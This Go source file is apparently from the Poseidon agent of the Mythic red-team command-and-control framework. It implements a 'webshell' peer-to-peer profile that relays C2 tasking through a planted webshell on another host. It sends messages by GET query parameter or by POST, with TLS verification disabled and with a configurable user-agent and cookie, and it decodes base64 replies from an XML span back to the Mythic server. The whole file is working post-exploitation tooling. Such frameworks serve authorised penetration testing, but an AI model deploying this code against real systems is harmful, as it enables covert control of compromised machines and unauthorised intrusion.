package p2p

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/link_webshell"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/google/uuid"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
)

var (
	internalWebshellConnections     = make(map[string]link_webshell.Arguments)
	internalWebshellConnectionMutex sync.RWMutex
)

type webshell struct {
}

var tr = &http.Transport{
	TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	MaxIdleConns:      1,
	MaxConnsPerHost:   1,
	DisableKeepAlives: true,
}
var client = &http.Client{
	Transport: tr,
}

func (c webshell) ProfileName() string {
	return "webshell"
}
func (c webshell) ProcessIngressMessageForP2P(delegate *structs.DelegateMessage) {
	var err error = nil
	internalWebshellConnectionMutex.Lock()
	if conn, ok := internalWebshellConnections[delegate.UUID]; ok {
		if delegate.MythicUUID != "" && delegate.MythicUUID != delegate.UUID {
			// Mythic told us that our UUID was fake and gave the right one
			utils.PrintDebug(fmt.Sprintf("adding new MythicUUID: %s from %s\n", delegate.MythicUUID, delegate.UUID))
			internalWebshellConnections[delegate.MythicUUID] = conn
			// remove our old one
			utils.PrintDebug(fmt.Sprintf("removing internal tcp connection for: %s\n", delegate.UUID))
			delete(internalWebshellConnections, delegate.UUID)
		}
		utils.PrintDebug(fmt.Sprintf("Sending ingress data to P2P connection\n"))
		err = SendWebshellData([]byte(delegate.Message), conn, delegate.UUID)
	}
	internalWebshellConnectionMutex.Unlock()
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send data to linked p2p connection, %v\n", err))
		go c.RemoveInternalConnection(delegate.UUID)
	}
}
func (c webshell) RemoveInternalConnection(connectionUUID string) bool {
	internalWebshellConnectionMutex.Lock()
	defer internalWebshellConnectionMutex.Unlock()
	if _, ok := internalWebshellConnections[connectionUUID]; ok {
		utils.PrintDebug(fmt.Sprintf("about to remove a connection, %s\n", connectionUUID))
		//printInternalTCPConnectionMap()

		delete(internalWebshellConnections, connectionUUID)
		fmt.Printf("connection removed, %s\n", connectionUUID)
		//printInternalTCPConnectionMap()
		return true
	} else {
		// we don't know about this connection we're asked to close
		return true
	}
}
func (c webshell) AddInternalConnection(connection interface{}) {
	//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
	connectionUUID := uuid.New().String()
	internalWebshellConnectionMutex.Lock()
	defer internalWebshellConnectionMutex.Unlock()
	newConnection := connection.(link_webshell.Arguments)
	utils.PrintDebug(fmt.Sprintf("AddNewInternalConnectionChannel with UUID ( %s ) for %v\n", connectionUUID, newConnection.URL))
	internalWebshellConnections[newConnection.TargetUUID] = newConnection
}
func (c webshell) GetInternalP2PMap() string {
	output := "----- internalWebshellConnectionsMap ------\n"
	internalWebshellConnectionMutex.RLock()
	defer internalWebshellConnectionMutex.RUnlock()
	for k, v := range internalWebshellConnections {
		output += fmt.Sprintf("UUID: %s, Connection: %v\n", k, v)
	}
	output += fmt.Sprintf("---- done -----\n")
	return output
}
func init() {
	registerAvailableP2P(webshell{})
}

type webshellResponse struct {
	XMLName xml.Name `xml:"span"`
	ID      string   `xml:"id,attr"`
	Text    string   `xml:",chardata"`
}

// SendWebshellData sends TCP P2P data in the proper format for poseidon_tcp connections
func SendWebshellData(sendData []byte, conn link_webshell.Arguments, connectionUUID string) error {

	utils.PrintDebug(fmt.Sprintf("using connection information: %v\n", conn))
	utils.PrintDebug(fmt.Sprintf("Sending message to webshell: %s\n", string(sendData)))
	if len(sendData) <= 50 {
		// this means we got nothing back from the translation container, just a base64 encoded UUID
		return nil
	}
	var req *http.Request
	var err error
	if len(sendData) > 4000 {
		req, err = http.NewRequest("POST", conn.URL, bytes.NewBuffer(sendData))
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
			return err
		}
		contentLength := len(sendData)
		req.ContentLength = int64(contentLength)
	} else {
		queryURL := conn.URL
		if strings.Contains(conn.URL, "?") {
			queryURL += "&" + conn.QueryParam + "="
		} else {
			queryURL += "?" + conn.QueryParam + "="
		}
		queryURL += url.QueryEscape(string(sendData))
		utils.PrintDebug(fmt.Sprintf("query: %s\n", queryURL))
		req, err = http.NewRequest("GET", queryURL, nil)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
			return err
		}
	}

	// set headers
	req.Header.Set("User-Agent", conn.UserAgent)
	tr.ProxyConnectHeader = http.Header{}
	tr.ProxyConnectHeader.Add("User-Agent", conn.UserAgent)
	cookie := http.Cookie{Name: conn.CookieName, Value: conn.CookieValue}
	req.AddCookie(&cookie)
	resp, err := client.Do(req)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error client.Do in p2p: %v\n", err))
		return err
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll in p2p: %v\n", err))
		return err
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		level := "warning"
		responses.NewAlertChannel <- structs.Alert{
			Alert: string(body),
			Level: &level,
		}
		utils.PrintDebug(fmt.Sprintf("error resp.StatusCode in p2p: %v\n%v\n", resp.StatusCode, string(body)))
		return err
	}

	var webshellResp webshellResponse
	err = xml.Unmarshal(body, &webshellResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error xml.Unmarshal in p2p: %v\n", err))
		return err
	}
	if webshellResp.ID != "task_response" {
		utils.PrintDebug(fmt.Sprintf("bad xml.Unmarshal id in p2p: %v\n", webshellResp))
		return err
	}
	if webshellResp.Text == "" {
		utils.PrintDebug(fmt.Sprintf("no response text in p2p: %v\n", webshellResp))
		return err
	}
	base64Resp, err := base64.StdEncoding.DecodeString(webshellResp.Text)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error base64 decoding response in p2p: %v\n", err))
		return err
	}

	finalResponse := base64.StdEncoding.EncodeToString(append([]byte(connectionUUID), base64Resp[:]...))
	newDelegateMessage := structs.DelegateMessage{}
	newDelegateMessage.Message = finalResponse
	newDelegateMessage.UUID = connectionUUID
	newDelegateMessage.C2ProfileName = "webshell"
	utils.PrintDebug(fmt.Sprintf("Adding delegate message to channel: %v\n", newDelegateMessage))
	responses.NewDelegatesToMythicChannel <- newDelegateMessage
	return nil
}
